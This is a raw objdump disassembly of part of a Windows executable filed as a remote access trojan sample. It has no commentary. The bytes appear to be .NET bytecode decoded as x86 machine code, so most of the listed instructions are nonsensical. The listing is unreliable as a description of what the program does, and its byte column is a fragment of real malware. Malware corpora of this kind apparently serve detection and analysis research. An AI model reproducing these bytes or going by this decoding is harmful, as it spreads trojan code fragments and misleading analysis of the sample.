
malware_samples/rat/e57d8c5a773d523e7e9d3f5d8fc5aa57689a4abe47bfed2805d0fe05019ff2dd.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e5 80                	in     $0x80,%eax
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 18 43 00    	add    %al,0x431800
  402013:	00 24 3d 00 00 03 00 	add    %ah,0x30000(,%edi,1)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	e2 00                	loop   0x402056
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 16                	add    %dl,(%esi)
  40205e:	0a 2b                	or     (%ebx),%ch
  402060:	11 00                	adc    %eax,(%eax)
  402062:	20 e8                	and    %ch,%al
  402064:	03 00                	add    (%eax),%eax
  402066:	00 28                	add    %ch,(%eax)
  402068:	10 00                	adc    %al,(%eax)
  40206a:	00 0a                	add    %cl,(%edx)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	06                   	push   %es
  40206f:	17                   	pop    %ss
  402070:	58                   	pop    %eax
  402071:	0a 06                	or     (%esi),%al
  402073:	7e 11                	jle    0x402086
  402075:	00 00                	add    %al,(%eax)
  402077:	04 28                	add    $0x28,%al
  402079:	11 00                	adc    %eax,(%eax)
  40207b:	00 0a                	add    %cl,(%edx)
  40207d:	fe 04 0b             	incb   (%ebx,%ecx,1)
  402080:	07                   	pop    %es
  402081:	2d de 28 03 00       	sub    $0x328de,%eax
  402086:	00 06                	add    %al,(%esi)
  402088:	16                   	push   %ss
  402089:	fe 01                	incb   (%ecx)
  40208b:	0c 08                	or     $0x8,%al
  40208d:	2c 07                	sub    $0x7,%al
  40208f:	16                   	push   %ss
  402090:	28 12                	sub    %dl,(%edx)
  402092:	00 00                	add    %al,(%eax)
  402094:	0a 00                	or     (%eax),%al
  402096:	00 00                	add    %al,(%eax)
  402098:	28 36                	sub    %dh,(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	06                   	push   %es
  40209d:	16                   	push   %ss
  40209e:	fe 01                	incb   (%ecx)
  4020a0:	0d 09 2c 07 16       	or     $0x16072c09,%eax
  4020a5:	28 12                	sub    %dl,(%edx)
  4020a7:	00 00                	add    %al,(%eax)
  4020a9:	0a 00                	or     (%eax),%al
  4020ab:	7e 0c                	jle    0x4020b9
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 28                	add    $0x28,%al
  4020b1:	13 00                	adc    (%eax),%eax
  4020b3:	00 0a                	add    %cl,(%edx)
  4020b5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4020b8:	04 2c                	add    $0x2c,%al
  4020ba:	06                   	push   %es
  4020bb:	28 26                	sub    %ah,(%esi)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	06                   	push   %es
  4020c0:	00 7e 04             	add    %bh,0x4(%esi)
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	04 28                	add    $0x28,%al
  4020c7:	13 00                	adc    (%eax),%eax
  4020c9:	00 0a                	add    %cl,(%edx)
  4020cb:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4020d1:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4020d4:	00 06                	add    %al,(%esi)
  4020d6:	00 7e 0f             	add    %bh,0xf(%esi)
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 28                	add    $0x28,%al
  4020dd:	13 00                	adc    (%eax),%eax
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	2c 07                	sub    $0x7,%al
  4020e3:	28 30                	sub    %dh,(%eax)
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	06                   	push   %es
  4020e8:	2b 01                	sub    (%ecx),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 06                	adc    (%esi),%eax
  4020ed:	11 06                	adc    %eax,(%esi)
  4020ef:	2c 06                	sub    $0x6,%al
  4020f1:	28 3f                	sub    %bh,(%edi)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	06                   	push   %es
  4020f6:	00 28                	add    %ch,(%eax)
  4020f8:	34 00                	xor    $0x0,%al
  4020fa:	00 06                	add    %al,(%esi)
  4020fc:	00 00                	add    %al,(%eax)
  4020fe:	de 05 26 00 00 de    	fiadds 0xde000026
  402104:	00 2b                	add    %ch,(%ebx)
  402106:	32 00                	xor    (%eax),%al
  402108:	00 28                	add    %ch,(%eax)
  40210a:	12 00                	adc    (%eax),%al
  40210c:	00 06                	add    %al,(%esi)
  40210e:	16                   	push   %ss
  40210f:	fe 01                	incb   (%ecx)
  402111:	13 07                	adc    (%edi),%eax
  402113:	11 07                	adc    %eax,(%edi)
  402115:	2c 0e                	sub    $0xe,%al
  402117:	00 28                	add    %ch,(%eax)
  402119:	1e                   	push   %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	06                   	push   %es
  40211d:	00 28                	add    %ch,(%eax)
  40211f:	1b 00                	sbb    (%eax),%eax
  402121:	00 06                	add    %al,(%esi)
  402123:	00 00                	add    %al,(%eax)
  402125:	00 de                	add    %bl,%dh
  402127:	05 26 00 00 de       	add    $0xde000026,%eax
  40212c:	00 20                	add    %ah,(%eax)
  40212e:	88 13                	mov    %dl,(%ebx)
  402130:	00 00                	add    %al,(%eax)
  402132:	28 10                	sub    %dl,(%eax)
  402134:	00 00                	add    %al,(%eax)
  402136:	0a 00                	or     (%eax),%al
  402138:	00 17                	add    %dl,(%edi)
  40213a:	13 08                	adc    (%eax),%ecx
  40213c:	2b c9                	sub    %ecx,%ecx
  40213e:	00 00                	add    %al,(%eax)
  402140:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 3b                	add    %bh,(%ebx)
  402147:	00 69 a4             	add    %ch,-0x5c(%ecx)
  40214a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402150:	00 00                	add    %al,(%eax)
  402152:	ac                   	lods   %ds:(%esi),%al
  402153:	00 20                	add    %ah,(%eax)
  402155:	cc                   	int3
  402156:	00 05 0f 00 00 01    	add    %al,0x100000f
  40215c:	22 02                	and    (%edx),%al
  40215e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402161:	00 0a                	add    %cl,(%edx)
  402163:	00 2a                	add    %ch,(%edx)
  402165:	00 00                	add    %al,(%eax)
  402167:	00 13                	add    %dl,(%ebx)
  402169:	30 02                	xor    %al,(%edx)
  40216b:	00 07                	add    %al,(%edi)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 02                	add    %al,(%edx)
  402171:	00 00                	add    %al,(%eax)
  402173:	11 00                	adc    %eax,(%eax)
  402175:	17                   	pop    %ss
  402176:	0a 2b                	or     (%ebx),%ch
  402178:	00 06                	add    %al,(%esi)
  40217a:	2a 00                	sub    (%eax),%al
  40217c:	1b 30                	sbb    (%eax),%esi
  40217e:	04 00                	add    $0x0,%al
  402180:	50                   	push   %eax
  402181:	00 00                	add    %al,(%eax)
  402183:	00 03                	add    %al,(%ebx)
  402185:	00 00                	add    %al,(%eax)
  402187:	11 00                	adc    %eax,(%eax)
  402189:	00 7e 0b             	add    %bh,0xb(%esi)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 6f                	add    $0x6f,%al
  402190:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402195:	16                   	push   %ss
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  40219c:	00 01                	add    %al,(%ecx)
  40219e:	0a 06                	or     (%esi),%al
  4021a0:	28 17                	sub    %dl,(%edi)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	0a 7e 07             	or     0x7(%esi),%bh
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	04 6f                	add    $0x6f,%al
  4021ab:	18 00                	sbb    %al,(%eax)
  4021ad:	00 0a                	add    %cl,(%edx)
  4021af:	28 53 00             	sub    %dl,0x0(%ebx)
  4021b2:	00 06                	add    %al,(%esi)
  4021b4:	72 01                	jb     0x4021b7
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	70 28                	jo     0x4021e2
  4021ba:	19 00                	sbb    %eax,(%eax)
  4021bc:	00 0a                	add    %cl,(%edx)
  4021be:	7e 0a                	jle    0x4021ca
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 28                	add    $0x28,%al
  4021c4:	1a 00                	sbb    (%eax),%al
  4021c6:	00 0a                	add    %cl,(%edx)
  4021c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c9:	1b 00                	sbb    (%eax),%eax
  4021cb:	00 0a                	add    %cl,(%edx)
  4021cd:	0b de                	or     %esi,%ebx
  4021cf:	06                   	push   %es
  4021d0:	26 00 16             	add    %dl,%es:(%esi)
  4021d3:	0b de                	or     %esi,%ebx
  4021d5:	00 07                	add    %al,(%edi)
  4021d7:	2a 01                	sub    (%ecx),%al
  4021d9:	10 00                	adc    %al,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	00 01                	add    %al,(%ecx)
  4021df:	00 47 48             	add    %al,0x48(%edi)
  4021e2:	00 06                	add    %al,(%esi)
  4021e4:	12 00                	adc    (%eax),%al
  4021e6:	00 01                	add    %al,(%ecx)
  4021e8:	13 30                	adc    (%eax),%esi
  4021ea:	01 00                	add    %eax,(%eax)
  4021ec:	b0 00                	mov    $0x0,%al
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	72 0f                	jb     0x402205
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	70 80                	jo     0x40217a
  4021fa:	01 00                	add    %eax,(%eax)
  4021fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4021ff:	17                   	pop    %ss
  402200:	00 00                	add    %al,(%eax)
  402202:	70 80                	jo     0x402184
  402204:	02 00                	add    (%eax),%al
  402206:	00 04 72             	add    %al,(%edx,%esi,2)
  402209:	31 00                	xor    %eax,(%eax)
  40220b:	00 70 80             	add    %dh,-0x80(%eax)
  40220e:	03 00                	add    (%eax),%eax
  402210:	00 04 72             	add    %al,(%edx,%esi,2)
  402213:	3f                   	aas
  402214:	00 00                	add    %al,(%eax)
  402216:	70 80                	jo     0x402198
  402218:	04 00                	add    $0x0,%al
  40221a:	00 04 72             	add    %al,(%edx,%esi,2)
  40221d:	4b                   	dec    %ebx
  40221e:	00 00                	add    %al,(%eax)
  402220:	70 80                	jo     0x4021a2
  402222:	05 00 00 04 72       	add    $0x72040000,%eax
  402227:	5b                   	pop    %ebx
  402228:	00 00                	add    %al,(%eax)
  40222a:	70 80                	jo     0x4021ac
  40222c:	06                   	push   %es
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 72                	add    $0x72,%al
  402231:	6d                   	insl   (%dx),%es:(%edi)
  402232:	00 00                	add    %al,(%eax)
  402234:	70 80                	jo     0x4021b6
  402236:	07                   	pop    %es
  402237:	00 00                	add    %al,(%eax)
  402239:	04 72                	add    $0x72,%al
  40223b:	7f 00                	jg     0x40223d
  40223d:	00 70 80             	add    %dh,-0x80(%eax)
  402240:	08 00                	or     %al,(%eax)
  402242:	00 04 72             	add    %al,(%edx,%esi,2)
  402245:	8b 00                	mov    (%eax),%eax
  402247:	00 70 80             	add    %dh,-0x80(%eax)
  40224a:	09 00                	or     %eax,(%eax)
  40224c:	00 04 72             	add    %al,(%edx,%esi,2)
  40224f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402250:	00 00                	add    %al,(%eax)
  402252:	70 80                	jo     0x4021d4
  402254:	0a 00                	or     (%eax),%al
  402256:	00 04 72             	add    %al,(%edx,%esi,2)
  402259:	3f                   	aas
  40225a:	00 00                	add    %al,(%eax)
  40225c:	70 80                	jo     0x4021de
  40225e:	0c 00                	or     $0x0,%al
  402260:	00 04 7e             	add    %al,(%esi,%edi,2)
  402263:	07                   	pop    %es
  402264:	00 00                	add    %al,(%eax)
  402266:	04 73                	add    $0x73,%al
  402268:	4b                   	dec    %ebx
  402269:	00 00                	add    %al,(%eax)
  40226b:	06                   	push   %es
  40226c:	80 0d 00 00 04 72 cb 	orb    $0xcb,0x72040000
  402273:	00 00                	add    %al,(%eax)
  402275:	70 80                	jo     0x4021f7
  402277:	0e                   	push   %cs
  402278:	00 00                	add    %al,(%eax)
  40227a:	04 72                	add    $0x72,%al
  40227c:	3f                   	aas
  40227d:	00 00                	add    %al,(%eax)
  40227f:	70 80                	jo     0x402201
  402281:	0f 00 00             	sldt   (%eax)
  402284:	04 28                	add    $0x28,%al
  402286:	2d 00 00 06 80       	sub    $0x80060000,%eax
  40228b:	10 00                	adc    %al,(%eax)
  40228d:	00 04 72             	add    %al,(%edx,%esi,2)
  402290:	d5 00                	aad    $0x0
  402292:	00 70 80             	add    %dh,-0x80(%eax)
  402295:	11 00                	adc    %eax,(%eax)
  402297:	00 04 72             	add    %al,(%edx,%esi,2)
  40229a:	d9 00                	flds   (%eax)
  40229c:	00 70 80             	add    %dh,-0x80(%eax)
  40229f:	12 00                	adc    (%eax),%al
  4022a1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4022a4:	1a 7e 13             	sbb    0x13(%esi),%bh
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	04 2a                	add    $0x2a,%al
  4022ab:	1e                   	push   %ds
  4022ac:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  4022b2:	2a 1a                	sub    (%edx),%bl
  4022b4:	7e 14                	jle    0x4022ca
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 2a                	add    $0x2a,%al
  4022ba:	1e                   	push   %ds
  4022bb:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4022c1:	2a 1a                	sub    (%edx),%bl
  4022c3:	7e 15                	jle    0x4022da
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	04 2a                	add    $0x2a,%al
  4022c9:	1e                   	push   %ds
  4022ca:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4022d0:	2a 1a                	sub    (%edx),%bl
  4022d2:	7e 16                	jle    0x4022ea
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	04 2a                	add    $0x2a,%al
  4022d8:	1e                   	push   %ds
  4022d9:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4022df:	2a 1a                	sub    (%edx),%bl
  4022e1:	7e 17                	jle    0x4022fa
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	04 2a                	add    $0x2a,%al
  4022e7:	1e                   	push   %ds
  4022e8:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4022ee:	2a 1a                	sub    (%edx),%bl
  4022f0:	7e 18                	jle    0x40230a
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 2a                	add    $0x2a,%al
  4022f6:	1e                   	push   %ds
  4022f7:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4022fd:	2a 1a                	sub    (%edx),%bl
  4022ff:	7e 19                	jle    0x40231a
  402301:	00 00                	add    %al,(%eax)
  402303:	04 2a                	add    $0x2a,%al
  402305:	1e                   	push   %ds
  402306:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  40230c:	2a 1a                	sub    (%edx),%bl
  40230e:	7e 1a                	jle    0x40232a
  402310:	00 00                	add    %al,(%eax)
  402312:	04 2a                	add    $0x2a,%al
  402314:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 2a                	add    $0x2a,%al
  40231b:	1e                   	push   %ds
  40231c:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  402322:	2a 1a                	sub    (%edx),%bl
  402324:	7e 1c                	jle    0x402342
  402326:	00 00                	add    %al,(%eax)
  402328:	04 2a                	add    $0x2a,%al
  40232a:	1e                   	push   %ds
  40232b:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  402331:	2a 1a                	sub    (%edx),%bl
  402333:	7e 1d                	jle    0x402352
  402335:	00 00                	add    %al,(%eax)
  402337:	04 2a                	add    $0x2a,%al
  402339:	1e                   	push   %ds
  40233a:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  402340:	2a 00                	sub    (%eax),%al
  402342:	00 00                	add    %al,(%eax)
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	07                   	pop    %es
  402347:	00 1e                	add    %bl,(%esi)
  402349:	03 00                	add    (%eax),%eax
  40234b:	00 04 00             	add    %al,(%eax,%eax,1)
  40234e:	00 11                	add    %dl,(%ecx)
  402350:	00 00                	add    %al,(%eax)
  402352:	18 17                	sbb    %dl,(%edi)
  402354:	1c 73                	sbb    $0x73,%al
  402356:	1c 00                	sbb    $0x0,%al
  402358:	00 0a                	add    %cl,(%edx)
  40235a:	25 20 00 c8 00       	and    $0xc80020,%eax
  40235f:	00 6f 1d             	add    %ch,0x1d(%edi)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 00                	or     (%eax),%al
  402366:	25 20 00 c8 00       	and    $0xc80020,%eax
  40236b:	00 6f 1e             	add    %ch,0x1e(%edi)
  40236e:	00 00                	add    %al,(%eax)
  402370:	0a 00                	or     (%eax),%al
  402372:	28 07                	sub    %al,(%edi)
  402374:	00 00                	add    %al,(%eax)
  402376:	06                   	push   %es
  402377:	00 7e 0e             	add    %bh,0xe(%esi)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	04 72                	add    $0x72,%al
  40237e:	cb                   	lret
  40237f:	00 00                	add    %al,(%eax)
  402381:	70 28                	jo     0x4023ab
  402383:	1f                   	pop    %ds
  402384:	00 00                	add    %al,(%eax)
  402386:	0a 0a                	or     (%edx),%cl
  402388:	06                   	push   %es
  402389:	39 eb                	cmp    %ebp,%ebx
  40238b:	00 00                	add    %al,(%eax)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	7e 02                	jle    0x402393
  402391:	00 00                	add    %al,(%eax)
  402393:	04 17                	add    $0x17,%al
  402395:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402399:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40239f:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a0:	20 00                	and    %al,(%eax)
  4023a2:	00 0a                	add    %cl,(%edx)
  4023a4:	73 21                	jae    0x4023c7
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	0a 7e 02             	or     0x2(%esi),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 17                	add    $0x17,%al
  4023af:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023b3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	00 0a                	add    %cl,(%edx)
  4023be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023c1:	22 00                	and    (%eax),%al
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	9a 0b 7e 01 00 00 04 	lcall  $0x400,$0x17e0b
  4023cc:	17                   	pop    %ss
  4023cd:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023d1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	20 00                	and    %al,(%eax)
  4023da:	00 0a                	add    %cl,(%edx)
  4023dc:	73 21                	jae    0x4023ff
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	0a 7e 01             	or     0x1(%esi),%bh
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	04 17                	add    $0x17,%al
  4023e7:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023eb:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f2:	20 00                	and    %al,(%eax)
  4023f4:	00 0a                	add    %cl,(%edx)
  4023f6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023f9:	22 00                	and    (%eax),%al
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	9a 28 11 00 00 0a 0c 	lcall  $0xc0a,$0x1128
  402404:	07                   	pop    %es
  402405:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402408:	00 06                	add    %al,(%esi)
  40240a:	0d 09 2c 56 00       	or     $0x562c09,%eax
  40240f:	07                   	pop    %es
  402410:	28 23                	sub    %ah,(%ebx)
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 13                	or     (%ebx),%dl
  402416:	04 00                	add    $0x0,%al
  402418:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40241b:	05 16 13 06 2b       	add    $0x2b061316,%eax
  402420:	38 11                	cmp    %dl,(%ecx)
  402422:	05 11 06 9a 13       	add    $0x139a0611,%eax
  402427:	07                   	pop    %es
  402428:	00 00                	add    %al,(%eax)
  40242a:	28 06                	sub    %al,(%esi)
  40242c:	00 00                	add    %al,(%eax)
  40242e:	06                   	push   %es
  40242f:	11 07                	adc    %eax,(%edi)
  402431:	08 6f 24             	or     %ch,0x24(%edi)
  402434:	00 00                	add    %al,(%eax)
  402436:	0a 00                	or     (%eax),%al
  402438:	28 06                	sub    %al,(%esi)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	06                   	push   %es
  40243d:	6f                   	outsl  %ds:(%esi),(%dx)
  40243e:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402443:	08 11                	or     %dl,(%ecx)
  402445:	08 2c 02             	or     %ch,(%edx,%eax,1)
  402448:	de 17                	ficoms (%edi)
  40244a:	00 de                	add    %bl,%dh
  40244c:	05 26 00 00 de       	add    $0xde000026,%eax
  402451:	00 00                	add    %al,(%eax)
  402453:	11 06                	adc    %eax,(%esi)
  402455:	17                   	pop    %ss
  402456:	58                   	pop    %eax
  402457:	13 06                	adc    (%esi),%eax
  402459:	11 06                	adc    %eax,(%esi)
  40245b:	11 05 8e 69 32 c0    	adc    %eax,0xc032698e
  402461:	00 2b                	add    %ch,(%ebx)
  402463:	0f 00 28             	verw   (%eax)
  402466:	06                   	push   %es
  402467:	00 00                	add    %al,(%eax)
  402469:	06                   	push   %es
  40246a:	07                   	pop    %es
  40246b:	08 6f 26             	or     %ch,0x26(%edi)
  40246e:	00 00                	add    %al,(%eax)
  402470:	0a 00                	or     (%eax),%al
  402472:	00 00                	add    %al,(%eax)
  402474:	38 95 00 00 00 00    	cmp    %dl,0x0(%ebp)
  40247a:	73 27                	jae    0x4024a3
  40247c:	00 00                	add    %al,(%eax)
  40247e:	0a 13                	or     (%ebx),%dl
  402480:	09 00                	or     %eax,(%eax)
  402482:	72 e5                	jb     0x402469
  402484:	00 00                	add    %al,(%eax)
  402486:	70 72                	jo     0x4024fa
  402488:	e5 00                	in     $0x0,%eax
  40248a:	00 70 73             	add    %dh,0x73(%eax)
  40248d:	28 00                	sub    %al,(%eax)
  40248f:	00 0a                	add    %cl,(%edx)
  402491:	13 0a                	adc    (%edx),%ecx
  402493:	11 09                	adc    %ecx,(%ecx)
  402495:	11 0a                	adc    %ecx,(%edx)
  402497:	6f                   	outsl  %ds:(%esi),(%dx)
  402498:	29 00                	sub    %eax,(%eax)
  40249a:	00 0a                	add    %cl,(%edx)
  40249c:	00 11                	add    %dl,(%ecx)
  40249e:	09 7e 0e             	or     %edi,0xe(%esi)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	04 6f                	add    $0x6f,%al
  4024a5:	2a 00                	sub    (%eax),%al
  4024a7:	00 0a                	add    %cl,(%edx)
  4024a9:	13 0b                	adc    (%ebx),%ecx
  4024ab:	11 0b                	adc    %ecx,(%ebx)
  4024ad:	17                   	pop    %ss
  4024ae:	8d 4b 00             	lea    0x0(%ebx),%ecx
  4024b1:	00 01                	add    %al,(%ecx)
  4024b3:	25 16 72 e7 00       	and    $0xe77216,%eax
  4024b8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024bb:	16                   	push   %ss
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	2b 00                	sub    (%eax),%eax
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4024c4:	0c 16                	or     $0x16,%al
  4024c6:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  4024cd:	0c 73                	or     $0x73,%al
  4024cf:	21 00                	and    %eax,(%eax)
  4024d1:	00 0a                	add    %cl,(%edx)
  4024d3:	17                   	pop    %ss
  4024d4:	11 0c 8e             	adc    %ecx,(%esi,%ecx,4)
  4024d7:	69 6f 2c 00 00 0a 9a 	imul   $0x9a0a0000,0x2c(%edi),%ebp
  4024de:	80 01 00             	addb   $0x0,(%ecx)
  4024e1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024e4:	06                   	push   %es
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	06                   	push   %es
  4024e8:	7e 02                	jle    0x4024ec
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	04 7e                	add    $0x7e,%al
  4024ee:	01 00                	add    %eax,(%eax)
  4024f0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024f3:	11 00                	adc    %eax,(%eax)
  4024f5:	00 0a                	add    %cl,(%edx)
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	26 00 00             	add    %al,%es:(%eax)
  4024fb:	0a 00                	or     (%eax),%al
  4024fd:	00 de                	add    %bl,%dh
  4024ff:	0d 11 09 2c 08       	or     $0x82c0911,%eax
  402504:	11 09                	adc    %ecx,(%ecx)
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40250c:	dc 00                	faddl  (%eax)
  40250e:	28 06                	sub    %al,(%esi)
  402510:	00 00                	add    %al,(%eax)
  402512:	06                   	push   %es
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402519:	0d 11 0d 39 29       	or     $0x29390d11,%eax
  40251e:	01 00                	add    %eax,(%eax)
  402520:	00 00                	add    %al,(%eax)
  402522:	72 eb                	jb     0x40250f
  402524:	00 00                	add    %al,(%eax)
  402526:	70 28                	jo     0x402550
  402528:	2e 00 00             	add    %al,%cs:(%eax)
  40252b:	0a 00                	or     (%eax),%al
  40252d:	17                   	pop    %ss
  40252e:	28 13                	sub    %dl,(%ebx)
  402530:	00 00                	add    %al,(%eax)
  402532:	06                   	push   %es
  402533:	00 28                	add    %ch,(%eax)
  402535:	06                   	push   %es
  402536:	00 00                	add    %al,(%eax)
  402538:	06                   	push   %es
  402539:	17                   	pop    %ss
  40253a:	73 2f                	jae    0x40256b
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 16                	or     (%esi),%dl
  402540:	14 fe                	adc    $0xfe,%al
  402542:	06                   	push   %es
  402543:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402548:	30 00                	xor    %al,(%eax)
  40254a:	00 0a                	add    %cl,(%edx)
  40254c:	73 31                	jae    0x40257f
  40254e:	00 00                	add    %al,(%eax)
  402550:	0a 28                	or     (%eax),%ch
  402552:	09 00                	or     %eax,(%eax)
  402554:	00 06                	add    %al,(%esi)
  402556:	00 28                	add    %ch,(%eax)
  402558:	08 00                	or     %al,(%eax)
  40255a:	00 06                	add    %al,(%esi)
  40255c:	28 06                	sub    %al,(%esi)
  40255e:	00 00                	add    %al,(%eax)
  402560:	06                   	push   %es
  402561:	6f                   	outsl  %ds:(%esi),(%dx)
  402562:	32 00                	xor    (%eax),%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	6f                   	outsl  %ds:(%esi),(%dx)
  402567:	33 00                	xor    (%eax),%eax
  402569:	00 0a                	add    %cl,(%edx)
  40256b:	17                   	pop    %ss
  40256c:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402570:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402576:	6f                   	outsl  %ds:(%esi),(%dx)
  402577:	20 00                	and    %al,(%eax)
  402579:	00 0a                	add    %cl,(%edx)
  40257b:	16                   	push   %ss
  40257c:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402583:	16                   	push   %ss
  402584:	6f                   	outsl  %ds:(%esi),(%dx)
  402585:	34 00                	xor    $0x0,%al
  402587:	00 0a                	add    %cl,(%edx)
  402589:	00 1a                	add    %bl,(%edx)
  40258b:	6a 28                	push   $0x28
  40258d:	0d 00 00 06 00       	or     $0x60000,%eax
  402592:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402595:	00 06                	add    %al,(%esi)
  402597:	d4 8d                	aam    $0x8d
  402599:	59                   	pop    %ecx
  40259a:	00 00                	add    %al,(%eax)
  40259c:	01 28                	add    %ebp,(%eax)
  40259e:	0b 00                	or     (%eax),%eax
  4025a0:	00 06                	add    %al,(%esi)
  4025a2:	00 16                	add    %dl,(%esi)
  4025a4:	6a 28                	push   $0x28
  4025a6:	0f 00 00             	sldt   (%eax)
  4025a9:	06                   	push   %es
  4025aa:	00 28                	add    %ch,(%eax)
  4025ac:	2f                   	das
  4025ad:	00 00                	add    %al,(%eax)
  4025af:	06                   	push   %es
  4025b0:	28 20                	sub    %ah,(%eax)
  4025b2:	00 00                	add    %al,(%eax)
  4025b4:	06                   	push   %es
  4025b5:	00 16                	add    %dl,(%esi)
